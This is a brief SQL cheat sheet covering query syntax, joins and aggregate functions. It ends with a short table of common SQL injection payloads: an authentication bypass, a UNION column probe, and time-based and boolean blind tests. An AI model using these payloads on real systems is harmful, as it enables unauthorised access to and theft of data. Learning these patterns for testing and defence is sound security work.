# SQL Cheat Sheet

## Query Syntax
| Statement | Description |
|-----------|-------------|
| `SELECT * FROM table` | Select all |
| `SELECT col1, col2 FROM table` | Select specific columns |
| `SELECT * WHERE condition` | Filter rows |
| `SELECT * ORDER BY col ASC/DESC` | Sort results |
| `SELECT * LIMIT N` | Limit N rows |
| `SELECT COUNT(*) FROM table` | Count rows |
| `SELECT DISTINCT col FROM table` | Unique values |
| `INSERT INTO table (col1) VALUES (val1)` | Insert row |
| `UPDATE table SET col=val WHERE condition` | Update rows |
| `DELETE FROM table WHERE condition` | Delete rows |

## Joins
| Join Type | Description |
|-----------|-------------|
| `INNER JOIN t2 ON t1.id = t2.id` | Matching rows only |
| `LEFT JOIN t2 ON t1.id = t2.id` | All t1 + matching t2 |
| `RIGHT JOIN t2 ON t1.id = t2.id` | All t2 + matching t1 |
| `FULL JOIN t2 ON t1.id = t2.id` | All rows from both |

## Aggregation
| Function | Description |
|----------|-------------|
| `COUNT(col)` | Count non-null |
| `SUM(col)` | Sum values |
| `AVG(col)` | Average |
| `MIN(col)` | Minimum |
| `MAX(col)` | Maximum |
| `GROUP BY col` | Group for aggregation |
| `HAVING condition` | Filter groups |

## Common SQLi Payloads
| Payload | Effect |
|---------|--------|
| `' OR 1=1 --` | Bypass auth |
| `' UNION SELECT null,null--` | Check column count |
| `' AND SLEEP(5) --` | Time-based blind |
| `' AND 1=1 --` / `' AND 1=2 --` | Boolean blind |